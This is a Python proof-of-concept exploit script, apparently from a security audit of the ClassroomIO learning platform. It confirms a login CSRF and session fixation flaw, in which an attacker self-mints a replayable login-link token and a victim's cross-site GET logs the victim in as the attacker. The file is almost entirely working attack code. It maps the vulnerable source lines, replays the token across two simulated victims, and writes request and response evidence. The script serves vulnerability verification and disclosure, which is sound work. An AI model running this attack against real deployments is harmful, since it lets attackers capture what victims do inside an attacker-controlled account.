#!/usr/bin/env python3
"""
VULN-026 (F-24) — Login CSRF / session fixation via a reusable, self-mintable
login-link GET.

Vulnerable code (targets/classroomio/):
  * session-establishing GET (no Origin/CSRF check, token NOT consumed):
        packages/db/src/auth/plugins/login-link.ts:38-116
        (verifies the JWT sig/expiry, inserts a session row, setSessionCookie, redirect)
  * self-mint route (any authenticated user, 5-min TTL, target=self):
        apps/api/src/routes/account/account.ts:71-89 (POST /account/view-as-student-token)
        apps/api/src/services/account/view-as-student.ts:18-24 (mintLoginLinkToken, ttl=5m)

Class: CWE-352 (login CSRF) / CWE-384 (session fixation).

The flaw: GET /api/auth/login-link?token=<jwt> creates and sets a full session with
no Origin/Referer/CSRF check. Under SameSite=Lax cookies a top-level cross-site GET
navigation still sends/sets cookies, so an attacker can drive a victim's browser to
this URL. The token is only signature/expiry-checked (no jti/nonce), so it is
REPLAYABLE within its TTL. Any authenticated user can self-mint a token for THEIR OWN
account, so an attacker mints for the attacker account and the victim ends up logged
in AS THE ATTACKER (session fixation into the attacker's account).

Exploitation idea: attacker A self-mints tokenA; a fresh victim cookie jar performs
GET /api/auth/login-link?token=tokenA (no Origin, like a cross-site nav); the victim's
resulting session resolves to user A. Repeat with a second victim jar → same token
still works.

Success proves: a cross-site GET (no CSRF token, no Origin) establishes a session whose
authenticated user is the ATTACKER's account, and the token is reusable across victims.
"""
import os
import sys
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import signup, log, banner, verdict, rid, API, BASE_URL  # noqa: E402

VULN = "VULN-026"
HERE = os.path.dirname(os.path.abspath(__file__))


def victim_navigation(token: str, origin=None):
    """A fresh cookie jar performing the cross-site top-level GET to login-link."""
    jar = requests.Session()
    headers = {}
    if origin:
        headers["Origin"] = origin  # even an attacker origin must not matter (no check)
    r = jar.get(f"{API}/api/auth/login-link", params={"token": token},
                headers=headers, allow_redirects=False, timeout=30)
    return jar, r


def whoami(jar: requests.Session) -> dict:
    r = jar.get(f"{API}/api/auth/get-session", timeout=30)
    try:
        data = r.json() or {}
    except Exception:
        return {}
    return (data or {}).get("user") or {}


def main():
    banner(VULN, "Login CSRF / session fixation via reusable self-mintable login-link GET")

    # Attacker sets up their own account and self-mints a login-link token for it.
    attacker = signup(label=f"attacker_{rid()}")
    aid, aemail = attacker.user.get("id"), attacker.email
    log("SETUP", f"attacker account: id={aid} email={aemail}")
    r = attacker.post("/account/view-as-student-token", json={})
    if r.status_code != 200:
        verdict(VULN, "FAILED", f"self-mint failed: {r.status_code} {r.text[:200]}")
        sys.exit(1)
    token = r.json()["data"]["token"]
    log("STEP", f"attacker self-minted a login-link token via POST /account/view-as-student-token (len={len(token)})")

    # Victim #1 — fresh browser, NO Origin (models a real cross-site top-level navigation).
    log("STEP", "victim #1 (fresh cookie jar, no Origin) navigates to GET /api/auth/login-link?token=<attacker>")
    jar1, resp1 = victim_navigation(token, origin=None)
    set_cookie1 = resp1.headers.get("set-cookie", "")
    who1 = whoami(jar1)
    log("INFO", f"  → HTTP {resp1.status_code}  Set-Cookie has session={'classroomio' in set_cookie1.lower()}  "
                f"get-session user id={who1.get('id')} email={who1.get('email')}")

    # Victim #2 — different fresh jar, attacker Origin header present (still must succeed → no CSRF/Origin check).
    log("STEP", "victim #2 (another fresh jar, attacker Origin) replays the SAME token")
    jar2, resp2 = victim_navigation(token, origin="https://attacker.example")
    who2 = whoami(jar2)
    log("INFO", f"  → HTTP {resp2.status_code}  get-session user id={who2.get('id')} email={who2.get('email')}")

    fixed1 = who1.get("id") == aid and who1.get("id") is not None
    fixed2 = who2.get("id") == aid and who2.get("id") is not None
    cookie_set = "classroomio" in set_cookie1.lower()

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "### VULN-026 — attacker self-mints, victim's cross-site GET fixes the session to attacker's account\n"
            f"POST {API}/account/view-as-student-token HTTP/1.1\n"
            f"Cookie: classroomio.session_token=<ATTACKER>\n\n{{}}\n\n"
            f"### victim browser (no Origin, no CSRF token) — a plain top-level navigation:\n"
            f"GET {API}/api/auth/login-link?token=<ATTACKER_TOKEN> HTTP/1.1\n"
            f"Host: localhost:21527\n\n"
            f"### victim is now authenticated AS THE ATTACKER:\n"
            f"GET {API}/api/auth/get-session HTTP/1.1\n"
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"attacker account id={aid} email={aemail}\n\n")
        f.write(f"victim#1 login-link → HTTP {resp1.status_code}\nSet-Cookie: {set_cookie1[:200]}\n")
        f.write(f"victim#1 get-session user = {who1}\n\n")
        f.write(f"victim#2 (attacker Origin) login-link → HTTP {resp2.status_code}\n")
        f.write(f"victim#2 get-session user = {who2}\n")

    if cookie_set:
        log("PROOF", "login-link GET returned Set-Cookie: classroomio.session_token with NO CSRF/Origin check")
    if fixed1:
        log("PROOF", f"victim #1 session resolves to the ATTACKER account (id={aid}) → session fixation / login CSRF")
    if fixed2:
        log("PROOF", "victim #2 (separate jar, attacker Origin) also fixed to the attacker account → token is REUSABLE")

    if fixed1 and fixed2 and cookie_set:
        verdict(VULN, "CONFIRMED",
                "cross-site login-link GET fixes a victim into the attacker's account; token reusable")
        log("OK", "confirmed login CSRF / session fixation via reusable self-mintable login-link GET")
        sys.exit(0)

    verdict(VULN, "FAILED", f"cookie_set={cookie_set} fixed1={fixed1} fixed2={fixed2}")
    sys.exit(1)


if __name__ == "__main__":
    main()
